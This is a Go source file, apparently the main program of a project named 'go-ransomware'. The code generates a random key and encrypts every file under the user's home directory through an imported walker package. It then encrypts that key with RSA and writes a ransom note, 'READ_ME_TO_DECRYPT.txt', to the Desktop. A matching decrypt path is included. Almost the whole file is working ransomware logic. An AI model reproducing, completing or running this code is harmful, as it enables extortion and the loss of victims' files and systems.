package main

import (
	"fmt"
	"os"
	"io"
	"strings"
	"archive/zip"
	"crypto/rand"
	"encoding/hex"
	"path/filepath"
	"github.com/Ywern1/go-ransomware/walker"
	"github.com/Ywern1/go-ransomware/rsa"
)

func GenerateKey() ([]byte, error) {
	Key := make([]byte, 32)
	_, err := rand.Read(Key)
	if err != nil {
		panic(err)
	}

	return Key, nil
}

func zipSource(source, archive string) error {
	// Create a ZIP file and zip.Writer
	f, err := os.Create(archive)
	if err != nil {
		return err
	}
	defer f.Close()

	writer := zip.NewWriter(f)
	defer writer.Close()

	//Go through all the files of the source
	filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		//Create a local file header
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		//set compression
		header.Method = zip.Deflate

		//Set relative path of a file as the header name
		header.Name, err = filepath.Rel(filepath.Dir(source), path)
		if err != nil {
			return err
		}
		if info.IsDir() {
			header.Name += "/"
		}

		//Create writer for the file header and save content of the file
		headerWriter, err := writer.CreateHeader(header)
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		f, err := os.Open(path)
		if err != nil {
			return err
		}
		defer f.Close()

		_, err = io.Copy(headerWriter, f)
		return err
	})

	return nil
}

func main() {
	
	HomeDir, err := os.UserHomeDir()
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println(HomeDir)

	var input string

	fmt.Print("Enter Encrypt or Decrypt: ")
	
	fmt.Scanln(&input)

	input = strings.ToLower(input)
	if input == "e" || input == "encrypt" {
		fmt.Println("Encrypting")
		EncKey, err := GenerateKey()
		if err != nil {
			fmt.Println()
		}

		err = walker.EncryptFiles(EncKey, HomeDir)
		if err != nil {
			fmt.Println(err)
		}

		cipherKey, err := rsa.EncryptRsa(EncKey)
		if err != nil {
			fmt.Println(err)
		}

		// Convert the key to a hexadecimal string
		keyStr := hex.EncodeToString(cipherKey)
		
		val := `Hello
		Your network/system was encrypted.
		Encrypted files have new extension.
		Your encryption key is : %s
		`
		data := []byte(fmt.Sprintf(val, keyStr))
		
		//drop a note to the desktop with decryption key
		os.WriteFile(HomeDir+"/Desktop/READ_ME_TO_DECRYPT.txt", data, 0600)

		if err := zipSource(walker.TempDir+"unencrypted", walker.TempDir+"unencrypted.zip"); err != nil {
			fmt.Println(err)
		}

	} else if input == "d" || input == "decrypt" {

		fmt.Println("Decrypting.")

		plainKey, err := rsa.DecryptRsa()
		if err != nil {
			fmt.Println(err)
		}

		walker.DecryptFiles(plainKey, HomeDir)

	} else {
		fmt.Println("Invalid input.")
	}
}